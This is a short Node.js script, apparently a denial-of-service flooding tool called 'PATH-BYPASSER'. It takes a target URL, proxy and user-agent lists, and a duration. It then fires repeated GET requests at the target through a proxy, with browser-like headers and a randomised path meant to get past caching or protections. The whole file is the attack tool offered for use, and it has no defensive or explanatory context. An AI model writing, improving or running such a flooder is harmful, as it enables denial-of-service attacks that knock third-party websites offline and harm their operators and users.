const request = require('request');
const fs = require('fs');

if (process.argv.length <= 5) {
  console.log('[PATH-BYPASSER] - V2.1\n\t\tUsed for bypass: node pathFlood.js <url> <proxylist> <ualist> <duration>');
  return;
}

const target = process.argv[2];

const proxies = fs.readFileSync(process.argv[3], 'utf-8')
  .replace(/\r/g, '')
  .split('\n');
const proxy = proxies[Math.floor(Math.random() * proxies.length)];

const uas = fs.readFileSync(process.argv[4], 'utf-8')
  .replace(/\r/g, '')
  .split('\n');
const ua = uas[Math.floor(Math.random() * uas.length)];

const duration = process.argv[5];

const headers = {
  'Connection': 'Keep-Alive',
  'Cache-Control': 'max-age=0',
  'Upgrade-Insecure-Requests': '1',
  'User-Agent': ua,
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Encoding': 'gzip, deflate, br',
  'Accept-Language': 'en-US;q=0.9'
};

const options = {
  url: target.replace('%RAND%', Math.floor(Math.random() * 10000)),
  headers: headers,
  proxy: 'http://' + proxy,
  method: 'GET'
};

let count = 0;

setInterval(() => {
  count++;
  request(options, (error, response, body) => {
    if (error) {
      console.log('Error:', error);
    } else {
      console.log('statusCode:', response && response.statusCode);
    }
    console.log(`[${count}] -> PATH_RESOVER -> ${options.url}`);
  });
}, duration);
